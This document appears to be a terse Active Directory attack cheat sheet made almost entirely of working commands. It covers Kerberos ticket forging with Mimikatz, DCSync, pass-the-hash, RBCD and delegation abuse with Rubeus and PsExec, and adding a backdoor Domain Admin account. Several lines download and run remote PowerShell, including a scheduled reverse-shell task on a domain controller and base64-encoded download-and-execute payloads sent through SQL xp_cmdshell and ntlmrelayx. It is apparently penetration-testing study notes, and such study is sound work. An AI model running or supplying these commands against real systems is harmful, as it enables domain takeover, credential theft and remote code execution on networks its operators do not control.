**Golden ticket**
```powershell
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:tricky.com /sid:S-1-5-21-500681758-3045653280-464737313 /krbtgt:ef8a14734e077595898d882b94a78f61 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```

**Silver Ticket**
```Powershell
Invoke-Mimikatz -Command '"kerberos::golden /domain:sub.domain.local sid:Domain-S-I-D target:machine.sub.domain.local /service:CIFS /rc4:6f5b5acaf7433b3282ac22e21e62ff22 /user:Administrator /ptt"'
```

**DCSync Attack**
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:denkiair.com /user:denkiair\krbtgt"'
```

**Pass The Hash**
```mimikatz
sekurlsa::pth /user:Administrator /domain:targetdomain.com /ntlm:[NTLMHASH] /run:powershell.exe
```

**Scheduling RevShell Task**
```Powershell
schtasks /create /S dc.domain.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe c 'iex (New Object Net.WebClient DownloadString (''http://192.168.100.1:8080/Invoke-PowerShellTcp.ps1'')'"

schtasks /Run /S dc.domain.local /TN "STCheck"
```

**Unconstrained Delegation Exploitation**
```Powershell
Rubeus.exe monitor /interval:5 /filteruser:DC03$
SpoolSample.exe DC03 WEB05
Rubeus.exe ptt /ticket:

lsadump::dcsync /domain:infinity.com /user:infinity\krbtgt #in mimikatz
```

**RCBD Exploitation**
```Powershell
. .\Powerview.ps1

Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}} #enumeration

Get-DomainObject -Identity ops -Properties ms-DS-MachineAccountQuota #check machine quota

. .\powermad.ps1
New-MachineAccount -MachineAccount EVILCOMP -Password $(ConvertTo-SecureString 'h4x' -AsPlainText -Force)

Get-DomainComputer -Identity EVILCOMP #create a new computer

$sid =Get-DomainComputer -Identity EVILCOMP -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
$SDbytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDbytes,0) #convert SID

Get-DomainComputer -Identity web01.cowmotors-int.com | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} #set new SID

$RBCDbytes = Get-DomainComputer WEB01 -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity

$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RBCDbytes, 0

$Descriptor.DiscretionaryAcl #Verifying SecurityDescriptor

.\Rubeus.exe hash /password:h4x #get hash

.\Rubeus.exe s4u /user:EVILCOMP$ /rc4:AA6EAFB522589934A6E5CE92C6438221 /impersonateuser:administrator /msdsspn:CIFS/web01.cowmotors-int.com /ptt #getting the cifs ticket

.\PsExec64.exe \\web01.cowmotors-int.com powershell.exe -accepteula # get a shell
```

**Cross Domain Golden Ticket**
```Powershell
Get-DomainSID -Domain prod.corp1.com #get sid of current domain

Get-DomainSid -Domain corp1.com #get sid of target domain

kerberos::golden /user:administrator /domain:ops.comply.com /sid:S-1-5-21-2032401531-514583578-4118054891 /krbtgt:7c7865e6e30e54e8845aad091b0ff447 /sids:S-1-5-21-1135011135-3178090508-3151492220-519 /ptt
#rid will always be 519
```

**Golden Ticket With Trust Key**
```Powershell

Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-I-D sids:S-I-D-519 /rc4:7ef5be456dc8d7450fb8f5f7348746c5 /service:krbtgt /target:target.local /ticket:C:\Tools\trust_tkt.kirbi"' #forge tgt

.\Rubeus.exe asktgs /ticket:C:\Tools\trust_tkt.kirbi /service:cifs/rdc01.corp1.com /dc:rdc01.corp1.com /ptt #inject tgt

```

**SQL Double Hop**
```SQL
String enableadvoptions = "EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; RECONFIGURE;'') AT [DC01.CORP2.COM]') AT [RDC01.CORP1.COM]";
            
String enablexpcmdshell = "EXEC ('EXEC (''sp_configure ''''xp_cmdshell'''', 1; RECONFIGURE;'') AT [DC01.CORP2.COM]') AT [RDC01.CORP1.COM]";
	
String exeCmd = "EXEC ('EXEC (''xp_cmdshell ''''powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADEANAA3AC8AcgB1AG4ALgBwAHMAMQAnACkAIAB8ACAASQBFAFgA'''';'') AT [DC01.CORP2.COM]') AT [RDC01.CORP1.COM]";
```

**Enumerate ACE**
```Powershell
Get-ObjectAcl -SamAccountName will -ResolveGUIDs

Get-DomainObjectAcl -SamAccountName "Will" -SearchBase "CN=Administrator,CN=Users" -ResolveGUIDs

Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'will'}
```

**Abuse WriteDACL**
```powershell
Add-DomainObjectAcl -TargetIdentity MAILADMINS -PrincipalIdentity sqlsvc -Rights All
```

**Add Custom User**
```Powershell
net user zys Passw0rd /add /domain
net group "Domain Admins" zys /add /domain
```

**MSSQL Path Relay**
```Powershell
$text = "(New-Object System.Net.WebClient).DownloadString('http://192.168.49.165/run2.ps1') | IEX"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
$EncodedText = [Convert]::ToBase64String($bytes)
$EncodedText #encoding script

sudo proxychains impacket-ntlmrelayx --no-http-server -smb2support -t 172.16.165.151 -c 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADEANgA1AC8AcgB1AG4AMgAuAHAAcwAxACcAKQAgAHwAIABJAEUAWAA=' #ntlmrelayx

```